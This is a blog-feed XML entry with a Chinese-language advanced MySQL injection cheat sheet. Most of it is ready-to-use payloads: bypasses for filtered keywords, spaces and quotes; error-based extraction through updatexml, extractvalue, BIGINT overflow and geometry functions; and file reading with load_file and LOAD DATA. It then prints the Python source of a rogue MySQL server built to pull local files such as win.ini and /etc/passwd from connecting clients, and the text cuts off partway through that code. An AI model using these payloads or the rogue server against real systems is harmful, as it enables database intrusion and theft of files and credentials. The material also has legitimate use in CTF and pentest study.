<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Mysql注入</title>
      <link href="/posts/1527.html"/>
      <url>/posts/1527.html</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql注入进阶"><a href="#Mysql注入进阶" class="headerlink" title="Mysql注入进阶"></a>Mysql注入进阶</h1><p><strong>Written by <a href="http://pipinstall.cn/" target="_blank" rel="noopener" title="ttpfx">ttpfx</a></strong></p><p><strong>Added by <a href="https://hack-for.fun/" target="_blank" rel="noopener" m0nkey""="">M0nkey</a>、<a href="https://www.hackyangtuo.top/" target="_blank" rel="noopener" v1cuna""="">V1cuna</a></strong></p><p><strong>1.常见过滤手段的Bypass</strong></p><ol><li>and/or的过滤/拦截</li><li>空格被过滤/拦截</li><li>括号被过滤/拦截</li><li>逗号被过滤/拦截</li><li>information_schema被过滤/拦截</li><li>利用join进行无列名注入（使用别名）</li><li>单双引号被被过滤/拦截/转义</li><li>数字和单个字母被过滤/拦截</li><li>其他系统关键字被过滤/拦截</li><li>等号被过滤</li><li>过滤sleep()</li></ol><p><strong>2.编码转换产生的问题</strong></p><ol><li>宽字节注入</li><li>Latin1默认编码(php和mysql编码不同产生的注入)</li></ol><p><strong>3.报错注入</strong></p><ol><li>几何函数</li><li>基于BIGINT溢出错误的SQL注入(Mysql&gt;5.5.5)</li><li>不存在的函数</li><li>uuid相关函数(Mysql版本8.0.x)</li><li>报错函数速查表</li></ol><p><strong>4.文件读写</strong></p><ul><li>file_priv和secure-file-priv</li><li>读</li></ul><ol><li>读文件的三种方式</li><li>低权限读取文件</li><li>Mysql连接数据库时可读取文件（配合SSRF?）</li></ol><ul><li>写</li></ul><ol><li>写文件常规操作</li><li>日志法</li><li>DNSLOG外带数据(目标系统为Windows才可用)</li></ol><p><strong>5.二次注入</strong></p><p><strong>6.堆叠注入</strong></p><ol><li>预处理函数</li><li>自定义符号</li><li>handler代替select语句</li></ol><p><strong>7.sql注入用到的常见函数/符号归类</strong></p><ol><li>注释符</li><li>常用运算符</li><li>系统信息函数</li><li>进制转换</li><li>字符截取/拼接</li><li>常见全局变量</li><li>其他常用函数/语句</li></ol><p><strong>8.一些特殊的注入方式</strong></p><ol><li>order by 大小比较盲注</li><li>约束攻击</li><li>异或注入</li><li>regexp注入</li><li>无列名注入</li><li>Update/Insert/Delete注入</li><li>反引号注入</li><li>PDO场景下的SQL注入</li></ol><p><strong>9.sql注入一些小trick</strong></p><ol><li>LIMIT之后的字段数判断</li><li>通过正则回溯机制绕过/union.+?select/ig</li></ol><h2 id="前言"><a href="#前言" class="headerlink" title="前言﻿"></a>前言﻿</h2><p>总体是按照Yunen师傅(膜) <a href="https://xz.aliyun.com/t/7169" target="_blank" rel="noopener" title="对MYSQL注入相关内容及部分Trick的归类小结">对MYSQL注入相关内容及部分Trick的归类小结</a> 一文来进行的架构<br>自己做了一些改动和补充，如有不正确之处，还望指正</p><p>基础的一些注入知识，如普通注入、报错注入、时间/布尔盲注、宽字节注入、二次注入的基础知识就不写了，具体刷一遍sqli-lab 1~65就可明白，若不嫌弃可看一下我写的 <a href="http://pipinstall.cn/sqli-lab-less165通关及代码分析/" target="_blank" rel="noopener" title="sqli-lab Less1-65通关及代码分析">sqli-lab Less1-65通关及代码分析</a>，或者直接看上面Yunen师傅的文章</p><h2 id="1-常见过滤手段的Bypass"><a href="#1-常见过滤手段的Bypass" class="headerlink" title="1.常见过滤手段的Bypass"></a>1.常见过滤手段的Bypass</h2><h4 id="1-1-and-or的过滤-拦截"><a href="#1-1-and-or的过滤-拦截" class="headerlink" title="1-1.and/or的过滤/拦截"></a>1-1.and/or的过滤/拦截</h4><p>双写<br>使用运算符(||、&amp;&amp;)<br>直接使用拼接=号<br>使用异或注入</p><h4 id="1-2-空格被过滤-拦截"><a href="#1-2-空格被过滤-拦截" class="headerlink" title="1-2.空格被过滤/拦截"></a>1-2.空格被过滤/拦截</h4><p>多层括号嵌套<br>改用+号<br>使用注释/**/<br>and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略<br>%09, %0a, %0b, %0c, %0d, %a0等部分不可见字符可也代替空格（因为Windows的解析机制无法使用特殊字符代替空格，需要Linux的服务器环境才行）</p><h4 id="1-3-括号被过滤-拦截"><a href="#1-3-括号被过滤-拦截" class="headerlink" title="1-3.括号被过滤/拦截"></a>1-3.括号被过滤/拦截</h4><p>order by 大小比较盲注（见下面的讲解）</p><h4 id="1-4-逗号被过滤-拦截"><a href="#1-4-逗号被过滤-拦截" class="headerlink" title="1-4.逗号被过滤/拦截"></a>1-4.逗号被过滤/拦截</h4><ul><li>改用盲注</li><li>使用join语句代替，如union select 1,2,3 可改为 union select<br>join(select 1) join(select 2) join(select 3)</li><li>substr(data from 1 for 1)相当于substr(data,1,1)、limit 9 offset 4相当于limt 9,4</li></ul><h4 id="1-5-information-schema被过滤-拦截"><a href="#1-5-information-schema被过滤-拦截" class="headerlink" title="1-5.information_schema被过滤/拦截"></a>1-5.information_schema被过滤/拦截</h4><p>利用innodb存储引擎(需要Mysql版本在5.5.x后并且Mysql开启了innoDB引擎)，例子如下：</p><pre><code class="sql">select table_name from mysql.innodb_table_stats where database_name=database();select table_name from mysql.innodb_index_stats where database_name=database();</code></pre><p>接下来的四个只能用于查表名，无法查询列名，所以进一步获取数据还需无列名注入<br>sys.schema_auto_increment_columns<br>sys.x$schema_table_statistics_with_buffer<br>sys.schema_table_statistics_with_buffer<br>sys.x$ps_schema_table_statistics_io</p><p>那么接下来就补充一下无列名注入吧</p><h5 id="利用join进行无列名注入（使用别名）"><a href="#利用join进行无列名注入（使用别名）" class="headerlink" title="利用join进行无列名注入（使用别名）"></a>利用join进行无列名注入（使用别名）</h5><p>join … using(xx)</p><p>当知道表名为users时，使用如下语句得到列名<br>第一列：?id=-1’union all select*from (select * from users as a join users b)c#<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%871.png" alt=""></p><p>第二列：?id=-1’ union all select*from (select * from users as a join users b using(id))c–+<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%872.png" alt=""></p><p>第三列：?id=-1’ union all select*from (select * from users as a join users b using(id,username))c–+<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%873.png" alt=""></p><p>后面的列名可以此类推</p><h4 id="1-6-单双引号被被过滤-拦截-转义"><a href="#1-6-单双引号被被过滤-拦截-转义" class="headerlink" title="1-6.单双引号被被过滤/拦截/转义"></a>1-6.单双引号被被过滤/拦截/转义</h4><ul><li><p>可根据sql语句，使用转移符号逃逸出一个单/双引号，例题可参考[BJDCTF 2nd]简单注入</p></li><li><p>需要逃逸单引号的情况：尝试是否存在编码问题而产生的SQL注入。<br>不需要逃逸单引号的情况：字符串可用十六进制(hex函数)表示、也可通过进制转换函数表示成其他进制或者使用其他编码，如char()<br>SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</p></li><li><p>还可以使用%2527<br>主要绕过magic_quotes_gpc过滤，因为%25解码为%,结合后面的27也就是%27也就是’，所以成功绕过过滤。</p></li></ul><h4 id="1-7-数字和单个字母被过滤-拦截"><a href="#1-7-数字和单个字母被过滤-拦截" class="headerlink" title="1-7.数字和单个字母被过滤/拦截"></a>1-7.数字和单个字母被过滤/拦截</h4><pre><code>false或!pi()：0true或!!pi()：1true+true：2floor(pi())：3ceil(pi())：4floor(version())：5ceil(version())：6ceil(pi()+pi())：7floor(version()+pi())：8floor(pi()*pi())：9ceil(pi()*pi())：10ceil(pi()*pi())+true：11ceil(pi()+pi()+version())：12floor(pi()*pi()+pi())：13ceil(pi()*pi()+pi())：14ceil(pi()*pi()+version())：15floor(pi()*version())：16ceil(pi()*version())：17ceil(pi()*version())+true：18floor((pi()+pi())*pi())：19ceil((pi()+pi())*pi())：20ceil(ceil(pi())*version())：21ceil(pi()*ceil(pi()+pi()))：22ceil((pi()+ceil(pi()))*pi())：23ceil(pi())*ceil(version())：24floor(pi()*(version()+pi()))：25floor(version()*version())：26ceil(version()*version())：27ceil(pi()*pi()*pi()-pi())：28floor(pi()*pi()*floor(pi()))：29</code></pre><p>简单演示一下：<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%874.png" alt=""></p><p>使用conv([0-9],10,36)可以表示0<del>9的数字，conv([10</del>35],10,36)可以表示a~z单个字母，conv([35+],10,36)可自行按照三十六进制转换</p><h4 id="1-8-其他系统关键字被过滤-拦截"><a href="#1-8-其他系统关键字被过滤-拦截" class="headerlink" title="1-8.其他系统关键字被过滤/拦截"></a>1-8.其他系统关键字被过滤/拦截</h4><p>双写绕过关键字过滤<br>使用同义函数/语句代替，如if函数可用如下语句代替。</p><pre><code class="sql">case when condition then 1 else 0 end</code></pre><h4 id="1-9-等号被过滤"><a href="#1-9-等号被过滤" class="headerlink" title="1-9.等号被过滤"></a>1-9.等号被过滤</h4><p>使用in或like关键字绕过</p><h4 id="1-10-过滤sleep"><a href="#1-10-过滤sleep" class="headerlink" title="1-10.过滤sleep()"></a>1-10.过滤sleep()</h4><p>参考：smlie师傅 <a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener" title="Mysql注入笔记">Mysql注入笔记</a></p><ul><li><p>BENCHMARK(count,expr)<br>BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。</p></li><li><p>笛卡尔积<br>select if(1=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0);</p></li><li><p>GET_LOCK<br>在一个session中可以先锁定一个变量例如：select get_lock(‘smi1e’,1)<br>然后通过另一个session 再次执行get_lock函数 select get_lock(‘smi1e’,5),此时会产生5 秒的延迟，其效果类似于sleep(5)。<br>但是利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。</p></li><li><p>RLIKE/REGEXP<br>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。<br>select rpad(‘a’,4999999,’a’) RLIKE concat(repeat(‘(a.*)+’,30),’b’);</p></li></ul><h2 id="2-编码转换产生的问题"><a href="#2-编码转换产生的问题" class="headerlink" title="2.编码转换产生的问题"></a>2.编码转换产生的问题</h2><h4 id="2-1-宽字节注入"><a href="#2-1-宽字节注入" class="headerlink" title="2-1.宽字节注入"></a>2-1.宽字节注入</h4><p>网上有很多讲解，这里就不再赘述了</p><h4 id="2-2-Latin1默认编码"><a href="#2-2-Latin1默认编码" class="headerlink" title="2-2.Latin1默认编码"></a>2-2.Latin1默认编码</h4><p>参考P神的文章：<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a><br>直接上一道例题</p><p>题目要求必须登录admin的账号，然而题目中有如下限制</p><pre><code class="php">&lt;?php$username = $_GET['username']if ($username === 'admin') {    die('Permission denied!');}$result = $mysqli-&gt;query("SELECT * FROM z_users where username = '{$username}' and password = '{$password}'");</code></pre><p>这道题的php编码是UTF-8，而Mysql编码是Latin1（Latin1是Mysql的默认编码），此时我们就可以利用php和Mysql的编码不同，以admin%c2作为账号登录即可登录成功</p><p>那么这么做的原理是什么呢？<br>Mysql在转换字符集的时候，将不完整的字符给忽略了。如 佬 这个汉字的UTF-8编码是\xE4\xBD\xAC，我们可以依次尝试访问下面三个URL：</p><pre><code>test.php?username=admin%e4test.php?username=admin%e4%bdtest.php?username=admin%e4%bd%ac</code></pre><p>结果前两者都能成功获取到username=admin的结果，而最后一个URL，也就是当我们输入佬字完整的编码时，将会出现错误</p><p>原因很简单，因为latin1并不支持汉字，所以utf8汉字转换成latin1时就抛出了错误。那前两次为什么没有抛出错误？因为前两次输入的编码并不完整，Mysql在进行编码转换时，就将其忽略了。</p><p>但由于有一些字节值是不允许出现在UTF-8编码中的，所以只有部分字符是可用的，具体可参考上面P神的文章</p><h2 id="3-报错注入："><a href="#3-报错注入：" class="headerlink" title="3.报错注入："></a>3.报错注入：</h2><p>参考：<a href="https://blog.sari3l.com/posts/9622f295/" target="_blank" rel="noopener" title="Mysql注入基础小结">Mysql注入基础小结</a><br>常用到的报错大概也就如下三种<br>双查询报错：使用了floor()和rand()函数+group by句式<br>updatexml()<br>extractvalue()<br>这里就不记录了，可参考其他讲解</p><p>一些双查询小补充：</p><h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><h5 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h5><pre><code>?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</code></pre><ul><li>floor：函数只返回整数部分，小数部分舍弃。</li><li>round：函数四舍五入，大于0.5的部分进位，不到则舍弃。</li></ul><h5 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h5><p>目前比较常见的几种报错注入的方法都是利用了mysql某些不能称为bug的bug来实现的。</p><p>下面就以 rand() 函数来进行说明。mysql的官方文档中对 rand() 函数有特殊的说明：</p><pre><code>RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. However, you can retrieve rows in random order like this:</code></pre><p>官方文档中的意思是：在<code>where</code>语句中，<code>where</code>每执行一次，<code>rand()</code>函数就会被计算一次。<code>rand()</code>不能作为<code>order by</code>的条件字段，同理也不能作为<code>group by</code>的条件字段。</p><p>因此在 mysql 中，可以构造一个值不确定而有可重复的字段作为<code>group by</code>的条件字段，这是就可以报出类似于<code>Duplicate entry ‘…’ for key ‘group_key’</code>的错误</p><h4 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h4><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是<code>ExtractValue()</code>和<code>UpdateXML()</code></p><p>因此在mysql 小于5.1.5中不能用<code>ExtractValue</code>和<code>UpdateXML</code>进行报错注入。</p><h5 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h5><pre><code>?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></pre><h5 id="注入原理-1"><a href="#注入原理-1" class="headerlink" title="注入原理"></a>注入原理</h5><pre><code>UPDATEXML (XML_document, XPath_string, new_value);</code></pre><ul><li>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc</li><li>第二个参数：XPath_string ( Xpath 格式的字符串)</li><li>第三个参数：new_value，String 格式，替换查找到的符合条件的数据</li><li>作用：改变文档中符合条件的节点的值</li></ul><p>返回结果为连接参数产生的字符串。如有任何一个参数为<code>NULL</code> ，则返回值为<code>NULL</code>。</p><p>通过查询<code>@@version</code>,返回版本。然后<code>CONCAT</code>将其字符串化。因为<code>UPDATEXML</code>第二个参数需要<code>Xpath</code>格式的字符串,所以不符合要求，然后报错。</p><h4 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h4><h5 id="注入语句-2"><a href="#注入语句-2" class="headerlink" title="注入语句"></a>注入语句</h5><pre><code>?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</code></pre><h5 id="注入原理-2"><a href="#注入原理-2" class="headerlink" title="注入原理"></a>注入原理</h5><pre><code>EXTRACTVALUE (XML_document, XPath_string);</code></pre><ul><li>第一个参数：XML_document是 String 格式，为 XML 文档对象的名称，文中为 Doc</li><li>第二个参数：XPath_string ( Xpath 格式的字符串)</li><li>作用：从目标 XML 中返回包含所查询值的字符串</li></ul><p>第二个参数都要求是符合<code>xpath</code>语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里</p><h4 id="NAME-CONST-适用于低版本，不太好用"><a href="#NAME-CONST-适用于低版本，不太好用" class="headerlink" title="NAME_CONST(适用于低版本，不太好用)"></a>NAME_CONST(适用于低版本，不太好用)</h4><pre><code>?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)</code></pre><h4 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h4><pre><code>?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1</code></pre><h4 id="exp-5-5-5以上"><a href="#exp-5-5-5以上" class="headerlink" title="exp(5.5.5以上)"></a>exp(5.5.5以上)</h4><p>在 mysql 5.5 之前，整形溢出是不会报错的，根据官方文档说明<code>out-of-range-and-overflow</code>，只有版本号大于5.5.5 时，才会报错。利用<code>exp</code>函数也产生类似的溢出错误</p><pre><code>?id=1 and (select exp(~(select * from(select user())x)))</code></pre><p>当这上面的函数被ban时，我们还有许多可用的函数用于报错注入</p><h4 id="3-1-几何函数："><a href="#3-1-几何函数：" class="headerlink" title="3-1.几何函数："></a>3-1.几何函数：</h4><pre><code class="sql">GeometryCollection：id=1 AND GeometryCollection((select * from (select* from(select user())a)b))polygon()：id=1 AND polygon((select * from(select * from(select user())a)b))multipoint()：id=1 AND multipoint((select * from(select * from(select user())a)b))multilinestring()：id=1 AND multilinestring((select * from(select * from(select user())a)b))linestring()：id=1 AND LINESTRING((select * from(select * from(select user())a)b))multipolygon() ：id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></pre><h4 id="基于BIGINT溢出错误的SQL注入-Mysql-gt-5-5-5-："><a href="#基于BIGINT溢出错误的SQL注入-Mysql-gt-5-5-5-：" class="headerlink" title="基于BIGINT溢出错误的SQL注入(Mysql>5.5.5)："></a>基于BIGINT溢出错误的SQL注入(Mysql&gt;5.5.5)：</h4><p>这种注入方式有很多的运算符可用，这里举的例子就只使用其中一种，具体可参考：<a href="https://blog.csdn.net/weixin_43902454/article/details/96495984" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43902454/article/details/96495984</a><br>数据库：</p><pre><code class="mysql">!(select*from(select database())x)-~0</code></pre><p>表名：</p><pre><code class="mysql">!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0</code></pre><p>列名：</p><pre><code class="mysql">select !(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0;</code></pre><p>字段：</p><pre><code class="mysql">!(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;</code></pre><h4 id="3-3-不存在的函数"><a href="#3-3-不存在的函数" class="headerlink" title="3-3.不存在的函数"></a>3-3.不存在的函数</h4><p>随便输入一个不存在的函数，可能会返回当前所在的数据库名称。</p><h4 id="3-4-name-const"><a href="#3-4-name-const" class="headerlink" title="3-4.name_const()"></a>3-4.name_const()</h4><p>仅可获取数据库版本信息<br>payload: select * from(select name_const(version(),0x1),name_const(version(),0x1))a</p><h4 id="3-5-uuid相关函数-Mysql版本8-0-x"><a href="#3-5-uuid相关函数-Mysql版本8-0-x" class="headerlink" title="3-5.uuid相关函数(Mysql版本8.0.x)"></a>3-5.uuid相关函数(Mysql版本8.0.x)</h4><p>参数格式不正确。<br>SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));<br>SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</p><h4 id="3-6-报错函数速查表"><a href="#3-6-报错函数速查表" class="headerlink" title="3-6.报错函数速查表"></a>3-6.报错函数速查表</h4><table><thead><tr><th>类别</th><th>函数</th><th>版本需求</th><th>5.5.x</th><th>5.6.x</th><th style="">5.7.x</th><th>8.x</th><th>函数显错长度</th><th>Mysql报错内容长度</th><th>额外限制</th></tr></thead><tbody><tr><td>主键重复</td><td>floor round</td><td>?</td><td>√</td><td>√</td><td style="">√</td><td></td><td>64</td><td></td><td>data_type ≠ varchar</td></tr><tr><td>列名重复</td><td>name_const</td><td>?</td><td>√</td><td>√</td><td style="">√</td><td>√</td><td></td><td></td><td>only version()</td></tr><tr><td>列名重复</td><td>join</td><td>[5.5.49, ?)</td><td>√</td><td>√</td><td style="">√</td><td>√</td><td></td><td></td><td>only columns</td></tr><tr><td>数据溢出 - Double</td><td>1e308 cot exp pow</td><td>[5.5.5, 5.5.48]</td><td>√</td><td></td><td style=""></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>数据溢出 - BIGINT</td><td>1+~0</td><td>[5.5.5, 5.5.48]</td><td>√</td><td></td><td style=""></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>几何对象</td><td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td><td>[?, 5.5.48]</td><td>√</td><td></td><td style=""></td><td></td><td></td><td>244</td><td></td></tr><tr><td>空间函数 Geohash</td><td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td><td>[5.7, ?)</td><td></td><td></td><td style="">√</td><td>√</td><td>128</td><td></td><td></td></tr><tr><td>GTID</td><td>gtid_subset gtid_subtract</td><td>[5.6.5, ?)</td><td></td><td>√</td><td style="">√</td><td>√</td><td>200</td><td></td><td></td></tr><tr><td>JSON</td><td>json_*</td><td>[5.7.8, 5.7.11]</td><td></td><td></td><td style="">√</td><td></td><td>200</td><td></td><td></td></tr><tr><td>UUID</td><td>uuid_to_bin bin_to_uuid</td><td>[8.0, ?)</td><td></td><td></td><td style=""></td><td>√</td><td>128</td><td></td><td></td></tr><tr><td>XPath</td><td>extractvalue updatexml</td><td>[5.1.5, ?)</td><td>√</td><td>√</td><td style="">√</td><td>√</td><td>32</td><td></td></tr></tbody></table><h2 id="4-文件读写"><a href="#4-文件读写" class="headerlink" title="4.文件读写"></a>4.文件读写</h2><h4 id="4-1-file-priv和secure-file-priv"><a href="#4-1-file-priv和secure-file-priv" class="headerlink" title="4-1.file_priv和secure-file-priv"></a>4-1.file_priv和secure-file-priv</h4><p>在讲Mysql文件读写之前，先要了解什么是file_priv和secure-file-priv</p><p>file_priv是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p><pre><code>select file_priv from mysql.user where user=$USER host=$HOST;</code></pre><p>secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下：<br>无内容，表示无限制。</p><ul><li>为NULL，表示禁止文件读/写。</li><li>为目录名，表示仅允许对特定目录的文件进行读/写。</li></ul><p>TIPS：5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。<br>三种方法查看当前secure-file-priv的值：</p><pre><code class="mysql">select @@secure_file_priv;select @@global.secure_file_priv;show variables like "secure_file_priv";</code></pre><p>两个参数的修改：<br>通过修改my.ini文件，添加：secure-file-priv=<br>启动时添加参数：mysqld.exe –secure-file-priv=</p><h4 id="4-2-读文件"><a href="#4-2-读文件" class="headerlink" title="4-2.读文件"></a>4-2.读文件</h4><p>Mysql读取文件通常使用load_file函数，语法如下：<br>select load_file(file_path);<br>第二种：<br>load data infile “/etc/passwd” into table test FIELDS TERMINATED BY ‘\n’;    #读取服务端文件<br>第三种：<br>load data local infile “/etc/passwd” into table test FIELDS TERMINATED BY ‘\n’;    #读取客户端文件</p><p>限制：</p><ul><li>前两种需要secure-file-priv无值或为有利目录。</li><li>都需要知道要读取的文件所在的绝对路径。</li><li>要读取的文件大小必须小于max_allowed_packet所设置的值</li></ul><h5 id="低权限读取文件"><a href="#低权限读取文件" class="headerlink" title="低权限读取文件"></a>低权限读取文件</h5><p>5.5.53secure-file-priv=NULL读文件payload，mysql8测试失败，其他版本自测。</p><pre><code class="mysql">drop table mysql.m1;CREATE TABLE mysql.m1 (code TEXT );LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';select * from mysql.m1;</code></pre><h5 id="Mysql连接数据库时可读取文件（配合SSRF-）"><a href="#Mysql连接数据库时可读取文件（配合SSRF-）" class="headerlink" title="Mysql连接数据库时可读取文件（配合SSRF?）"></a>Mysql连接数据库时可读取文件（配合SSRF?）</h5><p>这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。<br>简单描述该漏洞：<br>Mysql客户端在执行load data local语句的时，先向mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下：</p><p>原本的查询流程为：<br><code><br>客户端：我要把我的win.ini文件内容插入test表中<br>服务端：好，我要你的win.ini文件内容<br>客户端：win.ini的内容如下....</code></p><p>假设服务端由我们控制，把一个正常的流程篡改成如下<br><code><br>客户端：我要把我的win.ini文件内容插入test表中<br>服务端：好，我要你的conn.php内容<br>客户端：conn.php的内容如下???<br></code><br>换句话说：load data local语句要读取的文件会受到服务端的控制。<br>其次，在Mysql官方文档对于load data local语句的安全说明中有这么一句话:</p><pre>A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.</pre><p>意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是load data local语句。<br>这就会产生什么结果呢？之前讲的例子，将可以变成：<br><code><br>客户端：我需要查询test表下的xx内容<br>服务端：我需要你的conn.php内容<br>客户端：conn.php的内容如下???<br></code><br>可以看到，客户端相当于被攻击者给半劫持了。<br>利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。<br>简易恶意服务端代码：</p><pre><code class="python">#代码摘自：https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py#!/usr/bin/env python#coding: utf8import socketimport asyncoreimport asynchatimport structimport randomimport loggingimport logging.handlersPORT = 3306log = logging.getLogger(__name__)log.setLevel(logging.DEBUG)tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))log.addHandler(tmp_format)filelist = (#    r'c:\boot.ini',r'c:\windows\win.ini',#    r'c:\windows\system32\drivers\etc\hosts',#    '/etc/passwd',#    '/etc/shadow',)#================================================#=======No need to change after this lines=======#================================================__author__ = 'Gifts'def daemonize():    import os, warnings    if os.name != 'posix':        warnings.warn('Cant create daemon on non-posix system')        return    if os.fork(): os._exit(0)    os.setsid()    if os.fork(): os._exit(0)    os.umask(0o022)    null=os.open('/dev/null', os.O_RDWR)    for i in xrange(3):        try:            os.dup2(null, i)        except OSError as e:            if e.errno != 9: raise    os.close(null)class LastPacket(Exception):    passclass OutOfOrder(Exception):    passclass mysql_packet(object):    packet_header = struct.Struct('&lt;Hbb')    packet_header_long = struct.Struct('&lt;Hbbb')    def __init__(self, packet_type, payload):        if isinstance(packet_type, mysql_packet):            self.packet_num = packet_type.packet_num + 1        else:            self.packet_num = packet_type        self.payload = payload    def __str__(self):        payload_len = len(self.payload)        if payload_len &lt; 65536:            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)        else:            header = mysql_packet.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num)        result = "{0}{1}".format(            header,            self.payload        )        return result    def __repr__(self):        return repr(str(self))    @staticmethod    def parse(raw_data):        packet_num = ord(raw_data[0])        payload = raw_data[1:]        return mysql_packet(packet_num, payload)class http_request_handler(asynchat.async_chat):    def __init__(self, addr):        asynchat.async_chat.__init__(self, sock=addr[0])        self.addr = addr[1]        self.ibuffer = []        self.set_terminator(3)        self.state = 'LEN'        self.sub_state = 'Auth'        self.logined = False        self.push(            mysql_packet(                0,                "".join((                    '\x0a',  # Protocol                    '3.0.0-Evil_Mysql_Server' + '\0',  # Version                    #'5.1.66-0+squeeze1' + '\0',                    '\x36\x00\x00\x00',  # Thread ID                    'evilsalt' + '\0',  # Salt                    '\xdf\xf7',  # Capabilities                    '\x08',  # Collation                    '\x02\x00',  # Server Status                    '\0' * 13,  # Unknown                    'evil2222' + '\0',                ))            )        )        self.order = 1        self.states = ['LOGIN', 'CAPS', 'ANY']    def push(self, data):        log.debug('Pushed: %r', data)        data = str(data)        asynchat.async_chat.push(self, data)    def collect_incoming_data(self, data):        log.debug('Data recved: %r', data)        self.ibuffer.append(data)    def found_terminator(self):        data = "".join(self.ibuffer)        self.ibuffer = []        if self.state == 'LEN':            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1            if len_bytes &lt; 65536:                self.set_terminator(len_bytes)                self.state = 'Data'            else:                self.state = 'MoreLength'        elif self.state == 'MoreLength':            if data[0] != '\0':                self.push(None)                self.close_when_done()            else:                self.state = 'Data'        elif self.state == 'Data':            packet = mysql_packet.parse(data)            try:                if self.order != packet.packet_num:                    raise OutOfOrder()                else:                    # Fix ?                    self.order = packet.packet_num + 2                if packet.packet_num == 0:                    if packet.payload[0] == '\x03':                        log.info('Query')                        filename = random.choice(filelist)                        PACKET = mysql_packet(                            packet,                            '\xFB{0}'.format(filename)                        )                        self.set_terminator(3)                        self.state = 'LEN'                        self.sub_state = 'File'                        self.push(PACKET)                    elif packet.payload[0] == '\x1b':                        log.info('SelectDB')                        self.push(mysql_packet(                            packet,                            